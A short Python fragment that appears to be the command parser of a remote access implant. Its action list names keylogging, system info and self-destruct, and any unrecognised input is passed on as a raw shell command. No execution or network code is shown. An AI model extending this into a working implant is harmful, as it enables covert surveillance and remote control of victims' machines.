_KNOWN_ACTIONS = {"keylogger", "selfdestruct", "sysinfo"}


def register_plugin_actions(plugins):
    for p in plugins:
        _KNOWN_ACTIONS.add(p.name)


def parse_command(body):
    body = body.strip()
    if not body:
        return []
    lines = body.split("\n")
    first = lines[0].strip()
    parts = first.split(maxsplit=1)
    action = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if action in _KNOWN_ACTIONS:
        arg = first[len(action):].strip()
        if action == "selfdestruct":
            return [{"action": action, "args": []}]
        else:
            return [{"action": action, "args": [arg]}]
    return [{"action": "shell", "args": [body]}]
